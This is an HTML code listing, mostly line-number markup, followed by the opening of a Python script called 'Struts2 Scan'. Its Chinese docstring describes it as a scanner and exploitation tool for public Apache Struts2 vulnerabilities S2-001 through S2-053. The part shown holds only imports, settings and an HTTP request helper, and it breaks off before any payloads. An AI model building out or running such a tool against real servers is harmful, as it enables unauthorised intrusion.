class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br><span class="line">1312</span><br><span class="line">1313</span><br><span class="line">1314</span><br><span class="line">1315</span><br><span class="line">1316</span><br><span class="line">1317</span><br><span class="line">1318</span><br><span class="line">1319</span><br><span class="line">1320</span><br><span class="line">1321</span><br><span class="line">1322</span><br><span class="line">1323</span><br><span class="line">1324</span><br><span class="line">1325</span><br><span class="line">1326</span><br><span class="line">1327</span><br><span class="line">1328</span><br><span class="line">1329</span><br><span class="line">1330</span><br><span class="line">1331</span><br><span class="line">1332</span><br><span class="line">1333</span><br><span class="line">1334</span><br><span class="line">1335</span><br><span class="line">1336</span><br><span class="line">1337</span><br><span class="line">1338</span><br><span class="line">1339</span><br><span class="line">1340</span><br><span class="line">1341</span><br><span class="line">1342</span><br><span class="line">1343</span><br><span class="line">1344</span><br><span class="line">1345</span><br><span class="line">1346</span><br><span class="line">1347</span><br><span class="line">1348</span><br><span class="line">1349</span><br><span class="line">1350</span><br><span class="line">1351</span><br><span class="line">1352</span><br><span class="line">1353</span><br><span class="line">1354</span><br><span class="line">1355</span><br><span class="line">1356</span><br><span class="line">1357</span><br><span class="line">1358</span><br><span class="line">1359</span><br><span class="line">1360</span><br><span class="line">1361</span><br><span class="line">1362</span><br><span class="line">1363</span><br><span class="line">1364</span><br><span class="line">1365</span><br><span class="line">1366</span><br><span class="line">1367</span><br><span class="line">1368</span><br><span class="line">1369</span><br><span class="line">1370</span><br><span class="line">1371</span><br><span class="line">1372</span><br><span class="line">1373</span><br><span class="line">1374</span><br><span class="line">1375</span><br><span class="line">1376</span><br><span class="line">1377</span><br><span class="line">1378</span><br><span class="line">1379</span><br><span class="line">1380</span><br><span class="line">1381</span><br><span class="line">1382</span><br><span class="line">1383</span><br><span class="line">1384</span><br><span class="line">1385</span><br><span class="line">1386</span><br><span class="line">1387</span><br><span class="line">1388</span><br><span class="line">1389</span><br><span class="line">1390</span><br><span class="line">1391</span><br><span class="line">1392</span><br><span class="line">1393</span><br><span class="line">1394</span><br><span class="line">1395</span><br><span class="line">1396</span><br><span class="line">1397</span><br><span class="line">1398</span><br><span class="line">1399</span><br><span class="line">1400</span><br><span class="line">1401</span><br><span class="line">1402</span><br><span class="line">1403</span><br><span class="line">1404</span><br><span class="line">1405</span><br><span class="line">1406</span><br><span class="line">1407</span><br><span class="line">1408</span><br><span class="line">1409</span><br><span class="line">1410</span><br><span class="line">1411</span><br><span class="line">1412</span><br><span class="line">1413</span><br><span class="line">1414</span><br><span class="line">1415</span><br><span class="line">1416</span><br><span class="line">1417</span><br><span class="line">1418</span><br><span class="line">1419</span><br><span class="line">1420</span><br><span class="line">1421</span><br><span class="line">1422</span><br><span class="line">1423</span><br><span class="line">1424</span><br><span class="line">1425</span><br><span class="line">1426</span><br><span class="line">1427</span><br><span class="line">1428</span><br><span class="line">1429</span><br><span class="line">1430</span><br><span class="line">1431</span><br><span class="line">1432</span><br><span class="line">1433</span><br><span class="line">1434</span><br><span class="line">1435</span><br><span class="line">1436</span><br><span class="line">1437</span><br><span class="line">1438</span><br><span class="line">1439</span><br><span class="line">1440</span><br><span class="line">1441</span><br><span class="line">1442</span><br><span class="line">1443</span><br><span class="line">1444</span><br><span class="line">1445</span><br><span class="line">1446</span><br><span class="line">1447</span><br><span class="line">1448</span><br><span class="line">1449</span><br><span class="line">1450</span><br><span class="line">1451</span><br><span class="line">1452</span><br><span class="line">1453</span><br><span class="line">1454</span><br><span class="line">1455</span><br><span class="line">1456</span><br><span class="line">1457</span><br><span class="line">1458</span><br><span class="line">1459</span><br><span class="line">1460</span><br><span class="line">1461</span><br><span class="line">1462</span><br><span class="line">1463</span><br><span class="line">1464</span><br><span class="line">1465</span><br><span class="line">1466</span><br><span class="line">1467</span><br><span class="line">1468</span><br><span class="line">1469</span><br><span class="line">1470</span><br><span class="line">1471</span><br><span class="line">1472</span><br><span class="line">1473</span><br><span class="line">1474</span><br><span class="line">1475</span><br><span class="line">1476</span><br><span class="line">1477</span><br><span class="line">1478</span><br><span class="line">1479</span><br><span class="line">1480</span><br><span class="line">1481</span><br><span class="line">1482</span><br><span class="line">1483</span><br><span class="line">1484</span><br><span class="line">1485</span><br><span class="line">1486</span><br><span class="line">1487</span><br><span class="line">1488</span><br><span class="line">1489</span><br><span class="line">1490</span><br><span class="line">1491</span><br><span class="line">1492</span><br><span class="line">1493</span><br><span class="line">1494</span><br><span class="line">1495</span><br><span class="line">1496</span><br><span class="line">1497</span><br><span class="line">1498</span><br><span class="line">1499</span><br><span class="line">1500</span><br><span class="line">1501</span><br><span class="line">1502</span><br><span class="line">1503</span><br><span class="line">1504</span><br><span class="line">1505</span><br><span class="line">1506</span><br><span class="line">1507</span><br><span class="line">1508</span><br><span class="line">1509</span><br><span class="line">1510</span><br><span class="line">1511</span><br><span class="line">1512</span><br><span class="line">1513</span><br><span class="line">1514</span><br><span class="line">1515</span><br><span class="line">1516</span><br><span class="line">1517</span><br><span class="line">1518</span><br><span class="line">1519</span><br><span class="line">1520</span><br><span class="line">1521</span><br><span class="line">1522</span><br><span class="line">1523</span><br><span class="line">1524</span><br><span class="line">1525</span><br><span class="line">1526</span><br><span class="line">1527</span><br><span class="line">1528</span><br><span class="line">1529</span><br><span class="line">1530</span><br><span class="line">1531</span><br><span class="line">1532</span><br><span class="line">1533</span><br><span class="line">1534</span><br><span class="line">1535</span><br><span class="line">1536</span><br><span class="line">1537</span><br><span class="line">1538</span><br><span class="line">1539</span><br><span class="line">1540</span><br><span class="line">1541</span><br><span class="line">1542</span><br><span class="line">1543</span><br><span class="line">1544</span><br><span class="line">1545</span><br><span class="line">1546</span><br><span class="line">1547</span><br><span class="line">1548</span><br><span class="line">1549</span><br><span class="line">1550</span><br><span class="line">1551</span><br><span class="line">1552</span><br><span class="line">1553</span><br><span class="line">1554</span><br><span class="line">1555</span><br><span class="line">1556</span><br><span class="line">1557</span><br><span class="line">1558</span><br><span class="line">1559</span><br><span class="line">1560</span><br><span class="line">1561</span><br><span class="line">1562</span><br><span class="line">1563</span><br><span class="line">1564</span><br><span class="line">1565</span><br><span class="line">1566</span><br><span class="line">1567</span><br><span class="line">1568</span><br><span class="line">1569</span><br><span class="line">1570</span><br><span class="line">1571</span><br><span class="line">1572</span><br><span class="line">1573</span><br><span class="line">1574</span><br><span class="line">1575</span><br><span class="line">1576</span><br><span class="line">1577</span><br><span class="line">1578</span><br><span class="line">1579</span><br><span class="line">1580</span><br><span class="line">1581</span><br><span class="line">1582</span><br><span class="line">1583</span><br><span class="line">1584</span><br><span class="line">1585</span><br><span class="line">1586</span><br><span class="line">1587</span><br><span class="line">1588</span><br><span class="line">1589</span><br><span class="line">1590</span><br><span class="line">1591</span><br><span class="line">1592</span><br><span class="line">1593</span><br><span class="line">1594</span><br><span class="line">1595</span><br><span class="line">1596</span><br><span class="line">1597</span><br><span class="line">1598</span><br><span class="line">1599</span><br><span class="line">1600</span><br><span class="line">1601</span><br><span class="line">1602</span><br><span class="line">1603</span><br><span class="line">1604</span><br><span class="line">1605</span><br><span class="line">1606</span><br><span class="line">1607</span><br><span class="line">1608</span><br><span class="line">1609</span><br><span class="line">1610</span><br><span class="line">1611</span><br><span class="line">1612</span><br><span class="line">1613</span><br><span class="line">1614</span><br><span class="line">1615</span><br><span class="line">1616</span><br><span class="line">1617</span><br><span class="line">1618</span><br><span class="line">1619</span><br><span class="line">1620</span><br><span class="line">1621</span><br><span class="line">1622</span><br><span class="line">1623</span><br><span class="line">1624</span><br><span class="line">1625</span><br><span class="line">1626</span><br><span class="line">1627</span><br><span class="line">1628</span><br><span class="line">1629</span><br><span class="line">1630</span><br><span class="line">1631</span><br><span class="line">1632</span><br><span class="line">1633</span><br><span class="line">1634</span><br><span class="line">1635</span><br><span class="line">1636</span><br><span class="line">1637</span><br><span class="line">1638</span><br><span class="line">1639</span><br><span class="line">1640</span><br><span class="line">1641</span><br><span class="line">1642</span><br><span class="line">1643</span><br><span class="line">1644</span><br><span class="line">1645</span><br><span class="line">1646</span><br><span class="line">1647</span><br><span class="line">1648</span><br><span class="line">1649</span><br><span class="line">1650</span><br><span class="line">1651</span><br><span class="line">1652</span><br><span class="line">1653</span><br><span class="line">1654</span><br><span class="line">1655</span><br><span class="line">1656</span><br><span class="line">1657</span><br><span class="line">1658</span><br><span class="line">1659</span><br><span class="line">1660</span><br><span class="line">1661</span><br><span class="line">1662</span><br><span class="line">1663</span><br><span class="line">1664</span><br><span class="line">1665</span><br><span class="line">1666</span><br><span class="line">1667</span><br><span class="line">1668</span><br><span class="line">1669</span><br><span class="line">1670</span><br><span class="line">1671</span><br><span class="line">1672</span><br><span class="line">1673</span><br><span class="line">1674</span><br><span class="line">1675</span><br><span class="line">1676</span><br><span class="line">1677</span><br><span class="line">1678</span><br><span class="line">1679</span><br><span class="line">1680</span><br><span class="line">1681</span><br><span class="line">1682</span><br><span class="line">1683</span><br><span class="line">1684</span><br><span class="line">1685</span><br><span class="line">1686</span><br><span class="line">1687</span><br><span class="line">1688</span><br><span class="line">1689</span><br><span class="line">1690</span><br><span class="line">1691</span><br><span class="line">1692</span><br><span class="line">1693</span><br><span class="line">1694</span><br><span class="line">1695</span><br><span class="line">1696</span><br><span class="line">1697</span><br><span class="line">1698</span><br><span class="line">1699</span><br><span class="line">1700</span><br><span class="line">1701</span><br><span class="line">1702</span><br><span class="line">1703</span><br><span class="line">1704</span><br><span class="line">1705</span><br><span class="line">1706</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ChunkedEncodingError, ConnectionError, ConnectTimeout</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> concurrent <span class="keyword">import</span> futures</span><br><span class="line"></span><br><span class="line">__title__ = <span class="string">&#x27;Struts2 Scan&#x27;</span></span><br><span class="line">__version__ = <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;HatBoy&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下：</span></span><br><span class="line"><span class="string">S2-001,S2-003,S2-005,S2-007,S2-008,S2-009,S2-012,S2-013,S2-015,S2-016,S2-019,</span></span><br><span class="line"><span class="string">S2-029,S2-032,S2-033,S2-037,S2-045,S2-046,S2-048,S2-052,S2-053,S2-devMode</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">default_headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局代理</span></span><br><span class="line">proxies = <span class="literal">None</span></span><br><span class="line"><span class="comment"># 超时时间</span></span><br><span class="line">_tiemout = <span class="number">10</span></span><br><span class="line"><span class="comment"># 默认输出所有结果，包括不存在漏洞的</span></span><br><span class="line">is_quiet = <span class="literal">False</span></span><br><span class="line"><span class="comment"># 进程数</span></span><br><span class="line">process = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">url, headers=<span class="literal">None</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;GET请求发送包装&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        html = requests.get(url, headers=headers, proxies=proxies, timeout=_tiemout)</span><br><span class="line">        html = html.content.decode(encoding)</span><br><span class="line">        <span class="keyword">return</span> html.replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">except</span> ChunkedEncodingError <span class="keyword">as</span> e:</span><br><span class="line">        html = get_stream(url, headers, encoding)</span><br><span class="line">        <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">except</span> ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> ConnectTimeout <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR:&quot;</span> + <span class="string">&quot;HTTP连接超时错误&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ERROR:&#x27;</span> + <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_302</span>(<span class="params">url, headers=<span class="literal">None</span>, encoding=<span 